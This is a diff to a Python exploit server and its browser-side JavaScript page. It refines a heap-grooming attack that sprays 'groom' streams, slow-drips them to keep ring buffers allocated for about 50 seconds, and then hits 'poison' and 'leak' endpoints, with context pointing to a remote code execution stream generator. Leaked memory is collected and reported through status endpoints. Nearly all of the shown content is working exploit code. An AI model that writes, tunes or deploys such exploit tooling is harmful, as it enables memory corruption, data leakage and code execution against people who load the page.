@@ -112,6 +112,8 @@ def generate_rce_stream(prefix, command_block_extra, max_commands=None):
 
 leaked_data = []
 leak_lock = threading.Lock()
+active_grooms = 0
+groom_lock = threading.Lock()
 
 GROOM_LANDING = """<!DOCTYPE html>
 <html>
@@ -147,18 +149,21 @@ button { font-size: 1.1em; padding: 10px 20px; margin: 5px; border: none;
 const log = document.getElementById('log');
 function L(msg) { log.textContent += new Date().toTimeString().slice(0,8) + ' ' + msg + '\\n'; log.scrollTop = log.scrollHeight; }
 
+let activeGrooms = 0;
 async function startSpray(n) {
-    L('Starting spray: ' + n + ' groom...');
+    L('Starting spray: ' + n + ' groom (slow drip ~50s each)...');
+    activeGrooms = n;
     for (let i = 0; i < n; i++) {
         fetch('/groom/' + i).then(async resp => {
-            L('groom/' + i + ': ' + resp.status + ' len=' + resp.headers.get('content-length'));
+            L('groom/' + i + ': started, len=' + resp.headers.get('content-length'));
             const reader = resp.body.getReader();
             let total = 0;
             while (true) { const {done, value} = await reader.read(); if (done) break; total += value.length; }
-            L('groom/' + i + ': done ' + total + 'B');
-        }).catch(e => { if (e.name !== 'AbortError') L('groom/' + i + ': ' + e.message); });
+            activeGrooms--;
+            L('groom/' + i + ': done ' + total + 'B [' + activeGrooms + ' still active]');
+        }).catch(e => { activeGrooms--; if (e.name !== 'AbortError') L('groom/' + i + ': ' + e.message); });
     }
-    L('All ' + n + ' fetches launched');
+    L('All ' + n + ' fetches launched — ring buffers alive ~50s');
 }
 
 async function analyzePoison(endpoint, label) {
@@ -243,12 +248,15 @@ async function sendProbe(data) {
 async function fireAndProbe() {
     L('=== FULL SEQUENCE: spray -> wait -> poison -> leak ===');
     await startSpray(16);
-    L('Waiting 3s for ring buffers...');
-    await new Promise(r => setTimeout(r, 3000));
+    L('Waiting 5s for ring buffer allocation...');
+    await new Promise(r => setTimeout(r, 5000));
+    L('Active grooms: ' + activeGrooms + ' (ring buffers should be live)');
+    if (activeGrooms < 1) { L('WARNING: no active grooms — ring buffers may be freed!'); }
     await analyzePoison('/poison', 'poison-1kb');
-    L('Waiting 1s...');
-    await new Promise(r => setTimeout(r, 1000));
+    L('Waiting 2s...');
+    await new Promise(r => setTimeout(r, 2000));
     await analyzePoison('/poison/leak', 'leak-16b');
+    L('Active grooms remaining: ' + activeGrooms);
     L('=== SEQUENCE COMPLETE ===');
 }
 
@@ -317,10 +325,11 @@ def handle_client(ssl_sock, addr):
             _send_response(ssl_sock, "200 OK", "text/html", GROOM_LANDING)
 
         elif path.startswith("/groom/"):
-            slot = path.split("/")[2]
-            marker = (int(slot) % 254) + 1
+            slot_str = path.split("/")[2]
+            slot = int(slot_str) if slot_str.isdigit() else 0
+            marker = (slot % 254) + 1
             groom_data = build_groom_stream(marker, 131072)
-            print(f"  -> GROOM slot={slot} marker=0x{marker:02x} stream={len(groom_data)}B")
+            print(f"  -> GROOM slot={slot} marker=0x{marker:02x} stream={len(groom_data)}B [SLOW DRIP]")
             headers = (
                 b"HTTP/1.1 200 OK\r\n"
                 b"Content-Type: text/html; charset=utf-8\r\n"
@@ -330,12 +339,23 @@ def handle_client(ssl_sock, addr):
                 b"Cache-Control: no-store\r\n\r\n"
             )
             ssl_sock.sendall(headers)
-            chunk_size = 8192
-            for i in range(0, len(groom_data), chunk_size):
-                ssl_sock.sendall(groom_data[i:i + chunk_size])
-                if i + chunk_size < len(groom_data):
-                    time.sleep(0.02)
-            print(f"  -> GROOM slot={slot} complete")
+            with groom_lock:
+                global active_grooms
+                active_grooms += 1
+                print(f"  -> GROOM slot={slot} active (total active: {active_grooms})")
+            try:
+                # Phase 1: fast burst — first 32KB to trigger ring buffer allocation
+                fast_end = min(32768, len(groom_data))
+                ssl_sock.sendall(groom_data[:fast_end])
+                # Phase 2: slow drip — 4KB every 2s to keep ring buffer alive ~50s
+                drip_chunk = 4096
+                for i in range(fast_end, len(groom_data), drip_chunk):
+                    time.sleep(2.0)
+                    ssl_sock.sendall(groom_data[i:i + drip_chunk])
+            finally:
+                with groom_lock:
+                    active_grooms -= 1
+                    print(f"  -> GROOM slot={slot} finished (total active: {active_grooms})")
 
         elif path == "/poison":
             prefix = bytearray(1024)
@@ -411,9 +431,16 @@ def handle_client(ssl_sock, addr):
 
         elif path == "/spray/status":
             with leak_lock:
-                data = {"leaked_count": len(leaked_data),
-                        "leaked": leaked_data[-5:] if leaked_data else []}
-            _send_response(ssl_sock, "200 OK", "application/json", json.dumps(data))
+                ldata = {"leaked_count": len(leaked_data),
+                         "leaked": leaked_data[-5:] if leaked_data else []}
+            with groom_lock:
+                ldata["active_grooms"] = active_grooms
+            _send_response(ssl_sock, "200 OK", "application/json", json.dumps(ldata))
+
+        elif path == "/spray/active":
+            with groom_lock:
+                _send_response(ssl_sock, "200 OK", "application/json",
+                              json.dumps({"active_grooms": active_grooms}))
 
         elif path == "/favicon.ico":
             ssl_sock.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
